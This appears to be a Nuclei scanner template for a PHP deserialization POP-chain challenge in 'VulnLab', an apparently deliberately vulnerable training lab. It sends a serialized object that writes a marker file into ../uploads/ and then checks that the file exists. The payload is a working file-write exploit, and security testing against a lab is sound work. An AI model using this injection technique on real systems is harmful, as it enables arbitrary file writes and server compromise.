id: vulnlab-unserialize-medium

info:
  name: VulnLab 反序列化 POP 链 medium 档（类名大小写绕过）
  author: hediwen
  severity: critical
  tags: vulnlab,unserialize

http:
  - raw:
      - |
        POST /unserialize/medium.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        data=O%3A5%3A%22cache%22%3A3%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22pop_medium.txt%22%3Bs%3A5%3A%22value%22%3Bs%3A20%3A%22VULNLAB_POP_CHAIN_OK%22%3Bs%3A5%3A%22store%22%3BO%3A9%3A%22filestore%22%3A1%3A%7Bs%3A3%3A%22dir%22%3Bs%3A11%3A%22..%2Fuploads%2F%22%3B%7D%7D
      - |
        GET /uploads/pop_medium.txt HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200 && contains(body_2, 'VULNLAB_POP_CHAIN_OK')"
